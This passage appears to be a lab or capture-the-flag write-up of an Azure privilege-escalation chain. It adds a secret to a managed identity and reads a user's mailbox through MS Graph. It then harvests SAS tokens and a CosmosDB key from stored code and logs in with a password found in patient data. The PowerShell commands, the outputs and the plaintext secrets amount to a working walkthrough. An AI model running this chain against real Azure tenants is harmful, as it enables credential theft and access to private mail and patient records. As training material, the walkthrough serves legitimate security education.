"Content-Type" = "application/json"
"Authorization" = "Bearer $GraphToken"
}
} 
$Body = @{
"passwordCredential"= @{
"displayName" = "Password"
}
}
Invoke-RestMethod @Params -UseBasicParsing -Body ($Body | ConvertTo-Json)
```

- The Response shows the added Secret in it's plaintext form.
```powershell
{
    "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#microsoft.graph.passwordCredential",
    "customKeyIdentifier": null,
    "displayName": null,
    "endDateTime": "2026-04-10T09:20:35.7898641Z",
    "hint": "LVV",
    "keyId": "64298a66-31e0-4d52-939c-32267a3fc161",
    "secretText": "LVV8Q~jRT_iPjf.4zNixGao8oFE~i43XBUWXUbGv",
    "startDateTime": "2024-04-10T09:20:35.7898641Z"
}
```

- The auditor can now use the added secret to authenticate to Azure as the `mailpp` Managed Identity.
```powershell
PS C:\Auditor> $password = ConvertTo-SecureString 'LVV8Q~jRT_iPjf.4zNixGao8oFE~i43XBUWXUbGv' -AsPlainText -Force
PS C:\Auditor> $appid = 'f0823e33-c430-4dd2-a56a-dca3c3a346a4'
PS C:\Auditor> $creds = New-Object System.Management.Automation.PSCredential($appid, $password)
PS C:\Auditor> Connect-AzAccount -Credential $creds -ServicePrincipal -Tenant e0f999c1-86ee-47a0-bfd5-18470154b7cd
WARNING: The provided service principal secret will be included in the 'AzureRmContext.json' file found in the user
profile ( C:\Users\studentuser105\.Azure ). Please ensure that this directory has appropriate protections.

Account                              SubscriptionName TenantId                             Environment
-------                              ---------------- --------                             -----------
f0823e33-c430-4dd2-a56a-dca3c3a346a4                  e0f999c1-86ee-47a0-bfd5-18470154b7cd AzureCloud
```

- The auditor queries the MS Graph API to discover app permissions that `mailapp` might have.
```powershell
$GraphToken = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
$Params = @{
"URI" = "https://graph.microsoft.com/v1.0/servicePrincipals/4a9a9c00-bf17-43d8-b437-fe8144c8df15/appRoleAssignments"
"Method" = "GET"
"Headers" = @{
"Authorization" = "Bearer $GraphToken"
"Content-Type" = "application/json"
}
}

$RoleAssignments = Invoke-RestMethod @Params -UseBasicParsing
$RoleAssignments.value
```

```powershell

id                   : AJyaShe_2EO0N_6BRMjfFS3Mt2NL-w5JqNFAw2e_2Cg
deletedDateTime      :
appRoleId            : df021288-bdef-4463-88db-98f22de89214
createdDateTime      : 2022-06-20T11:06:13.5594346Z
principalDisplayName : mailapp
principalId          : 4a9a9c00-bf17-43d8-b437-fe8144c8df15
principalType        : ServicePrincipal
resourceDisplayName  : Microsoft Graph
resourceId           : c44d6d94-e2cc-4f30-a0d0-2e37682b2978

id                   : AJyaShe_2EO0N_6BRMjfFbksvwwU2tFCv0Ch_bDHaJ8
deletedDateTime      :
appRoleId            : 810c84a8-4a9e-49e6-bf7d-12d183f40d01
createdDateTime      : 2022-06-20T11:06:13.7469384Z
principalDisplayName : mailapp
principalId          : 4a9a9c00-bf17-43d8-b437-fe8144c8df15
principalType        : ServicePrincipal
resourceDisplayName  : Microsoft Graph
resourceId           : c44d6d94-e2cc-4f30-a0d0-2e37682b2978
```

- The auditor uses the [Microsoft Graph permissions reference](https://learn.microsoft.com/en-us/graph/permissions-reference) to resolve the `appRoleId` attribute.
	- `df021288-bdef-4463-88db-98f22de89214` -> [`User.Read.All`](https://learn.microsoft.com/en-us/graph/permissions-reference#userreadall)
	- `810c84a8-4a9e-49e6-bf7d-12d183f40d01` -> [`Mail.Read`](https://learn.microsoft.com/en-us/graph/permissions-reference#mailread)
- The `Mail.Read` Role has quite a few permissions which can be abused using MS Graph API according to the [official documentation](https://learn.microsoft.com/en-us/graph/api/resources/mail-api-overview?view=graph-rest-1.0). This Role allows its holders to access all Entra ID User Identities since it is a prerequisite to access their mails. This can be leveraged to list all the User Identities in the current Tenant.
```powershell
PS C:\Auditor> Get-AzADUser

DisplayName         Id                                   Mail                                    UserPrincipalName
-----------         --                                   ----                                    -----------------
Aaron M Shires      cfcb95e6-b0a9-4804-bb07-2025282aad10                                         AaronShires@pharmacorphq.onmicrosoft.com
Aida K Vanpelt      7e58824b-65fa-41e2-986e-8097fc29c1d3                                         AidaVanpelt@pharmacorphq.onmicrosoft.com
Albert L Molina     ee34335f-142d-409c-9cd2-b795868274df                                         AlbertMolina@pharmacorphq.onmicrosoft.com
Alexander K Camp    a029a904-2068-40bb-82d6-443fb8165271                                         AlexanderCamp@pharmacorphq.onmicrosoft.com

<snip>

erpupdates          80589898-5a7b-4767-af56-30f2006156f3 erpupdates@pharmacorphq.onmicrosoft.com erpupdates@pharmacorphq.onmicrosoft.com

<snip>

Marie R Williams    0505af70-fea0-4dc9-8a8e-89cb1d0a16c5 MarieWilliams@pharmacorphq.onmicroso... MarieWilliams@pharmacorphq.onmicrosoft.com

<snip>
```

- The auditor notices that only 2 Security identities have the attribute `Mail` assigned to them which means that their inboxes are active and can be queried for stored mails. This can be verified by querying the MS Graph API to display Security Identities that have the O365 license enabled.
```powershell
$GraphToken = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
$URL = "https://graph.microsoft.com/v1.0/users?`$top=500"
$Params = @{
"URI" = $URL
"Method" = "GET"
"Headers" = @{
"Content-Type" = "application/json"
"Authorization" = "Bearer $GraphToken"
}
}
$Users = Invoke-RestMethod @Params -UseBasicParsing

foreach($User in $Users.value) {
$UserID = $User.id
$URL = "https://graph.microsoft.com/v1.0/users/$UserID/licenseDetails"
$Params = @{
"URI" = $URL
"Method" = "GET"
"Headers" = @{
"Content-Type" = "application/json"
"Authorization" = "Bearer $GraphToken"
}
}
$LicenseDetails = Invoke-RestMethod @Params -UseBasicParsing
If($LicenseDetails.value -ne "" -and $LicenseDetails.value -ne $null) { 
[PSCustomObject]@{
ID = $User.id
DisplayName = $User.displayName
UserPrincipalName = $User.userPrincipalName
LicenseType = $LicenseDetails.value.skuPartNumber
}
}
}
```

```powershell
ID                                   DisplayName      UserPrincipalName                          LicenseType
--                                   -----------      -----------------                          -----------
0505af70-fea0-4dc9-8a8e-89cb1d0a16c5 Marie R Williams MarieWilliams@pharmacorphq.onmicrosoft.com O365_BUSINESS_ESSEN...
```

- The auditor can attempt to list any messages in the inbox of `MarieWilliams@pharmacorphq.onmicrosoft.com` to find sensitive information.
###### Postman
```http
GET /v1.0/users/MarieWilliams@pharmacorphq.onmicrosoft.com/messages HTTP/1.1
Host: graph.microsoft.com
Authorization: eyJ0eX...CMGlvvgcvw
```
###### PowerShell
```powershell
$GraphToken = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
$user = 'MarieWilliams@pharmacorphq.onmicrosoft.com'
$URL = "https://graph.microsoft.com/v1.0/users/$user/messages"
$Params = @{
"URI" = $URL
"Method" = "GET"
"Headers" = @{
"Content-Type" = "application/json"
"Authorization" = "Bearer $GraphToken"
}
}

$Emails = Invoke-RestMethod @Params -UseBasicParsing
$Emails.value
```

```json
{
    "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#users('MarieWilliams%40pharmacorphq.onmicrosoft.com')/messages",
    "value": [
        {
            "@odata.etag": "W/\"CQAAABYAAABuOv53PmzjQYRYobfzvCWVAACSV8n8\"",
            "id": "AAMkADVhNjFkYWE4LTIxYjUtNDQzNi04MzI5LTVhMzg2ZjY1YTY3OQBGAAAAAABHsGgwJaTUTpY7VKQoPhO0BwBuOv53PmzjQYRYobfzvCWVAAAAAAEMAABuOv53PmzjQYRYobfzvCWVAACSZsmMAAA=",
            "createdDateTime": "2023-01-30T11:24:24Z",
            "lastModifiedDateTime": "2023-01-30T11:24:27Z",
            "changeKey": "CQAAABYAAABuOv53PmzjQYRYobfzvCWVAACSV8n8",
            "categories": [],
            "receivedDateTime": "2023-01-30T11:24:25Z",
            "sentDateTime": "2023-01-30T11:24:22Z",
            "hasAttachments": false,
            "internetMessageId": "<SG2PR06MB2937ADCCED30BF9B9400DB10FBD39@SG2PR06MB2937.apcprd06.prod.outlook.com>",
            "subject": "Your documents are approved - Please do not reply",
            "bodyPreview": "Dear Marie,\n\nYour documents are uploaded and approved. You can find the documents here - https://billingprocessorstg.blob.core.windows.net/mariewilliams\n\nIn case of any changes, please upload the documents again and submit a new request.\n\n\nRegards,",
            "importance": "normal",
            "parentFolderId": "AAMkADVhNjFkYWE4LTIxYjUtNDQzNi04MzI5LTVhMzg2ZjY1YTY3OQAuAAAAAABHsGgwJaTUTpY7VKQoPhO0AQBuOv53PmzjQYRYobfzvCWVAAAAAAEMAAA=",
            "conversationId": "AAQkADVhNjFkYWE4LTIxYjUtNDQzNi04MzI5LTVhMzg2ZjY1YTY3OQAQABqq0b4q6I5LrujjLTM3P4A=",
            "conversationIndex": "AQHZNJy2GqrRvirojkuu6OMtMzc/gA==",
            "isDeliveryReceiptRequested": false,
            "isReadReceiptRequested": false,
            "isRead": false,
            "isDraft": false,
            "webLink": "https://outlook.office365.com/owa/?ItemID=AAMkADVhNjFkYWE4LTIxYjUtNDQzNi04MzI5LTVhMzg2ZjY1YTY3OQBGAAAAAABHsGgwJaTUTpY7VKQoPhO0BwBuOv53PmzjQYRYobfzvCWVAAAAAAEMAABuOv53PmzjQYRYobfzvCWVAACSZsmMAAA%3D&exvsurl=1&viewmodel=ReadMessageItem",
            "inferenceClassification": "focused",
            "body": {
                "contentType": "text",
                "content": "Dear Marie,\n\nYour documents are uploaded and approved. You can find the documents here - https://billingprocessorstg.blob.core.windows.net/mariewilliams\n\nIn case of any changes, please upload the documents again and submit a new request.\n\n\nRegards,\n"
            },
            "sender": {
                "emailAddress": {
                    "name": "erpupdates",
                    "address": "/O=EXCHANGELABS/OU=EXCHANGE ADMINISTRATIVE GROUP (FYDIBOHF23SPDLT)/CN=RECIPIENTS/CN=3CC582BC6D0240D2A89DE96452DEF97D-JOHN_BEE3E3"
                }
            },
            "from": {
                "emailAddress": {
                    "name": "erpupdates",
                    "address": "/O=EXCHANGELABS/OU=EXCHANGE ADMINISTRATIVE GROUP (FYDIBOHF23SPDLT)/CN=RECIPIENTS/CN=3CC582BC6D0240D2A89DE96452DEF97D-JOHN_BEE3E3"
                }
            },
            "toRecipients": [
                {
                    "emailAddress": {
                        "name": "Marie R Williams",
                        "address": "MarieWilliams@pharmacorphq.onmicrosoft.com"
                    }
                }
            ],
            "ccRecipients": [],
            "bccRecipients": [],
            "replyTo": [],
            "flag": {
                "flagStatus": "notFlagged"
            }
        }
    ]
}
```

- The auditor discovered a public URL for a Blob Container in one of the mails. This can be reached using the **Azure Storage Explorer** to enumerate it for possible sensitive information stored. Inside, a file called `mapped.xml` can be found.
```xml
<FileShare>
    <Name>billingprocessor9a71</Name>
    <Url>https://billingprocessorstg.file.core.windows.net/billingprocessor9a71</Url>
    <Properties>
        <Content>P3N2PTIwMjItMTEtMDImc3M9ZiZzcnQ9c2NvJnNwPXJsJnNlPTIwMjQtMDgtMzFUMTk6MjE6MDBaJnN0PTIwMjQtMDMtMDFUMTI6MjE6MDBaJnNwcj1odHRwcyZzaWc9RjI0TXg1blU3U3lIQURGJTJCcVNSa2JJTVd6N2laWEpkUmJuN3NPYXcwN1FzJTNE</Content>
    </Properties>
</FileShare>
```

- The file holds an encoded/encrypted blob with a Public URL for a File Share. The auditor can reach that File Share using the **Azure Storage Explorer** to enumerate it for possible sensitive information stored. The auditor can attempt to Base64 decode the blob, revealing the following plaintext value: `?sv=2022-11-02&ss=f&srt=sco&sp=rl&se=2024-08-31T19:21:00Z&st=2024-03-01T12:21:00Z&spr=https&sig=F24Mx5nU7SyHADF%2BqSRkbIMWz7iZXJdRbn7sOaw07Qs%3D`
- This essentially reveals the SAS Token for the File Share that the URL point to. Combining both values grants the auditor the final SAS URL value: `https://billingprocessorstg.file.core.windows.net/billingprocessor9a71?sv=2022-11-02&ss=f&srt=sco&sp=rl&se=2024-08-31T19:21:00Z&st=2024-03-01T12:21:00Z&spr=https&sig=F24Mx5nU7SyHADF%2BqSRkbIMWz7iZXJdRbn7sOaw07Qs%3D`
- The File Share holds 2 folders, one of which is named `site` and holds some interesting information.
###### `__init__.py`
```python
import logging

import azure.functions as func


def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')

    connection_string = "https://phcbillingstorage.blob.core.windows.net/?sv=2022-11-02&ss=b&srt=sco&sp=rltfx&se=2025-01-31T00:57:35Z&st=2024-04-02T16:57:35Z&spr=https,http&sig=LYt9mLl3Deo6hnQgr9%2FCnJpLYFysoMzx%2BvxKp8JT%2BVI%3D"
    from azure.storage.blob import BlobServiceClient
    blob_service_client = BlobServiceClient.from_connection_string(self.connection_string)

    # Get account information for the Blob Service
    account_info = blob_service_client.get_account_information()

    return func.HttpResponse(f"{account_info}")
```
###### `function.json`
```json
{
  "bindings": [
    {
      "authLevel": "function",
      "type": "httpTrigger",
      "direction": "in",
      "name": "req",
      "methods": [
        "get",
        "post"
      ]
    },
    {
      "type": "http",
      "direction": "out",
      "name": "$return"
    }
  ]
}
```

- Those files essentially describe an Azure Function App's performed actions (`__init__.py`) and trigger conditions (`function.json`). A SAS URL (`https://phcbillingstorage.blob.core.windows.net/?sv=2022-11-02&ss=b&srt=sco&sp=rltfx&se=2025-01-31T00:57:35Z&st=2024-04-02T16:57:35Z&spr=https,http&sig=LYt9mLl3Deo6hnQgr9%2FCnJpLYFysoMzx%2BvxKp8JT%2BVI%3D`) is included in the `__init__.py` file and can be used to connect to a Storage Account.
- 2 Blob Containers are placed inside the Storage Account, one of which is named `appbackup` and contains an interesting file, `PatentEntryApp`. The auditor can download and unzip that file revealing 2 interesting files that contain information about a connection to a CosmosDB instance.
###### `Program.cs`
```c#
using System;
using System.Threading.Tasks;
using System.Configuration;
using System.Collections.Generic;
using System.Net;
using Microsoft.Azure.Cosmos;

namespace PatientEntryApp
{
    class Program
    {
        // The Azure Cosmos DB endpoint for running this sample.
        private static readonly string EndpointUri = ConfigurationManager.AppSettings["EndPointUri"];

        // The primary key for the Azure Cosmos account.
        private static readonly string PrimaryKey = ConfigurationManager.AppSettings["PrimaryKey"];

        // The Cosmos client instance
        private CosmosClient cosmosClient;

        // The database we will create
        private Database database;

        // The container we will create.
        private Container container;

        // The name of the database and container we will create
        private string databaseId = "PatientInfo";
        private string containerId = "PersonalInfo";

        // <Main>
        public static async Task Main(string[] args)
        {
            try
            {
                Console.WriteLine("Beginning operations...\n");
                Program p = new Program();
                await p.StartAsync();

            }
            catch (CosmosException de)
            {
                Exception baseException = de.GetBaseException();
                Console.WriteLine("{0} error occurred: {1}", de.StatusCode, de);
            }
            catch (Exception e)
            {
                Console.WriteLine("Error: {0}", e);
            }
            finally
            {
                Console.WriteLine("End of demo, press any key to exit.");
                Console.ReadKey();
            }
        }
        // </Main>

        // <StartAsync>
        /// <summary>
        /// Entry point to call methods that operate on Azure Cosmos DB resources in this sample
        /// </summary>
        public async Task StartAsync()
        {
            // Create a new instance of the Cosmos Client
            this.cosmosClient = new CosmosClient(EndpointUri, PrimaryKey, new CosmosClientOptions() { ApplicationName = "PatientEntryApp" });
            await this.CreateDatabaseAsync();
            await this.CreateContainerAsync();
            await this.ScaleContainerAsync();
            await this.AddItemsToContainerAsync();
            await this.QueryItemsAsync();
            await this.ReplaceFamilyItemAsync();
            await this.DeleteFamilyItemAsync();
            await this.DeleteDatabaseAndCleanupAsync();
        }
        // </StartAsync>

        // <CreateDatabaseAsync>
        /// <summary>
        /// Create the database if it does not exist
        /// </summary>
        private async Task CreateDatabaseAsync()
        {
            // Create a new database
            this.database = await this.cosmosClient.CreateDatabaseIfNotExistsAsync(databaseId);
            Console.WriteLine("Created Database: {0}\n", this.database.Id);
        }
        // </CreateDatabaseAsync>

        // <CreateContainerAsync>
        /// <summary>
        /// Create the container if it does not exist. 
        /// Specifiy "/partitionKey" as the partition key path since we're storing family information, to ensure good distribution of requests and storage.
        /// </summary>
        /// <returns></returns>
        private async Task CreateContainerAsync()
        {
            // Create a new container
            this.container = await this.database.CreateContainerIfNotExistsAsync(containerId, "/VaccineName");
            Console.WriteLine("Created Container: {0}\n", this.container.Id);
        }
        // </CreateContainerAsync>

        // <ScaleContainerAsync>
        /// <summary>
        /// Scale the throughput provisioned on an existing Container.
        /// You can scale the throughput (RU/s) of your container up and down to meet the needs of the workload. Learn more: https://aka.ms/cosmos-request-units
        /// </summary>
        /// <returns></returns>
        private async Task ScaleContainerAsync()
        {
            // Read the current throughput
            try
            {
                int? throughput = await this.container.ReadThroughputAsync();
                if (throughput.HasValue)
                {
                    Console.WriteLine("Current provisioned throughput : {0}\n", throughput.Value);
                    int newThroughput = throughput.Value + 100;
                    // Update throughput
                    await this.container.ReplaceThroughputAsync(newThroughput);
                    Console.WriteLine("New provisioned throughput : {0}\n", newThroughput);
                }
            }
            catch (CosmosException cosmosException) when (cosmosException.StatusCode == HttpStatusCode.BadRequest)
            {
                Console.WriteLine("Cannot read container throuthput.");
                Console.WriteLine(cosmosException.ResponseBody);
            }
            
        }
        
    }
}
```
###### `App.config`
```xml
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
  <appSettings>
    <add key="EndpointUri" value="https://backupdbsvc01.documents.azure.com:443/" />
    <add key="PrimaryKey" value="YBvekSUUBqvzpr7sqjfCaOLIIjhTw2haVzDoGWAbpMiG5S4nfNQ4xhxAok8Jl1pkGxNprKXv6bEiACDbrNAGFQ==" />
  </appSettings>
</configuration>
```

- The auditor can leverage the discolsed information to find the following information:
	- CosmosDB instance Endpoint -> `https://backupdbsvc01.documents.azure.com:443/`
	- Connection Key -> `YBvekSUUBqvzpr7sqjfCaOLIIjhTw2haVzDoGWAbpMiG5S4nfNQ4xhxAok8Jl1pkGxNprKXv6bEiACDbrNAGFQ==`
	- Database Id -> `PatientInfo`
	- Container Id -> `PersonalInfo`

- The auditor can utilize the **CosmosDB** PowerShell module to connect to that Cosmos DB instance and query it, using the exfiltrated information.
```powershell
PS C:\Auditor> Import-Module C:\Auditor\CosmosDB\4.5.0\CosmosDB.psd1
PS C:\Auditor> $primaryKey = ConvertTo-SecureString -String "YBvekSUUBqvzpr7sqjfCaOLIIjhTw2haVzDoGWAbpMiG5S4nfNQ4xhxAok8Jl1pkGxNprKXv6bEiACDbrNAGFQ==" -AsPlainText -Force
PS C:\Auditor> $cosmosDbContext = New-CosmosDbContext -Key $primaryKey -Account "backupdbsvc01" -Database "PatientInfo"
```

- The auditor can now retrieve the information from the Container named `PersonalInfo`.
```powershell
PS C:\Auditor> Get-CosmosDbDocument -Context $cosmosDbContext -CollectionId 'PersonalInfo' | fl *


id           : 08327598-d9b2-4296-8478-43b8a457e323
Name         : James B. Weaver
Age          : 67
VaccineName  : Pfizer
Note         :
_rid         : NSwdAIupIggBAAAAAAAAAA==
_self        : dbs/NSwdAA==/colls/NSwdAIupIgg=/docs/NSwdAIupIggBAAAAAAAAAA==/
_etag        : "0000ae19-0000-0100-0000-62bdc50e0000"
_attachments : attachments/
_ts          : 1656603918
Etag         : 0000ae19-0000-0100-0000-62bdc50e0000
ResourceId   : NSwdAIupIggBAAAAAAAAAA==
Timestamp    : 6/30/2022 8:45:18 AM
Uri          : dbs/NSwdAA==/colls/NSwdAIupIgg=/docs/NSwdAIupIggBAAAAAAAAAA==/
Attachments  : attachments/

<snip>

id           : c3b4c788-3d67-4bd5-a527-c3717dddc4b6
Name         : testentry
Age          : 45
VaccineName  : AstraZeneca
Note         : QmzuV{6}(X]reTG2r){
_rid         : NSwdAIupIggEAAAAAAAAAA==
_self        : dbs/NSwdAA==/colls/NSwdAIupIgg=/docs/NSwdAIupIggEAAAAAAAAAA==/
_etag        : "d7020b37-0000-0100-0000-6492de670000"
_attachments : attachments/
_ts          : 1687346791
Etag         : d7020b37-0000-0100-0000-6492de670000
ResourceId   : NSwdAIupIggEAAAAAAAAAA==
Timestamp    : 6/21/2023 4:26:31 AM
Uri          : dbs/NSwdAA==/colls/NSwdAIupIgg=/docs/NSwdAIupIggEAAAAAAAAAA==/
Attachments  : attachments/

<snip>
```

# 3. Final Flag
- The auditor previously discovered an interesting entry in the database.
```
id           : c3b4c788-3d67-4bd5-a527-c3717dddc4b6
Name         : testentry
Age          : 45
VaccineName  : AstraZeneca
Note         : QmzuV{6}(X]reTG2r){
_rid         : NSwdAIupIggEAAAAAAAAAA==
_self        : dbs/NSwdAA==/colls/NSwdAIupIgg=/docs/NSwdAIupIggEAAAAAAAAAA==/
_etag        : "d7020b37-0000-0100-0000-6492de670000"
_attachments : attachments/
_ts          : 1687346791
Etag         : d7020b37-0000-0100-0000-6492de670000
ResourceId   : NSwdAIupIggEAAAAAAAAAA==
Timestamp    : 6/21/2023 4:26:31 AM
Uri          : dbs/NSwdAA==/colls/NSwdAIupIgg=/docs/NSwdAIupIggEAAAAAAAAAA==/
Attachments  : attachments/
```

- The auditor previously discovered a database account. There is a User Identity with the exact same name.
```
Name              : phcvaccinedata
ResourceGroupName : VaccineComposition
ResourceType      : Microsoft.DocumentDb/databaseAccounts
Location          : eastus
ResourceId        : /subscriptions/aac02f74-b0d2-45d2-8fbc-8d33f274116f/resourceGroups/VaccineComposition/providers/Microsoft.DocumentDb/databaseAccounts/phcvaccinedata
Tags              :
                    Name                     Value
                    =======================  ==========
                    hidden-cosmos-mmspecial
                    defaultExperience        Core (SQL)
```

- The auditor can use the credentials `phcvaccinedata@pharmacorphq.onmicrosoft.com:QmzuV{6}(X]reTG2r){` to authenticate to Azure.
```powershell
PS C:\Auditor> $password = ConvertTo-SecureString 'QmzuV{6}(X]reTG2r){' -AsPlainText -Force
PS C:\Auditor> $creds = New-Object System.Management.Automation.PSCredential('phcvaccinedata@pharmacorphq.onmicrosoft.com', $password)
PS C:\Auditor> Connect-AzAccount -Credential $creds

Account                                     SubscriptionName TenantId                             Environment
-------                                     ---------------- --------                             -----------
phcvaccinedata@pharmacorphq.onmicrosoft.com PharmaCorp       e0f999c1-86ee-47a0-bfd5-18470154b7cd AzureCloud
```

- The auditor can also authenticate via the [Azure Portal](https://portal.azure.com) and access the CosmosDB that holds the sensitive data, such as vaccines composition.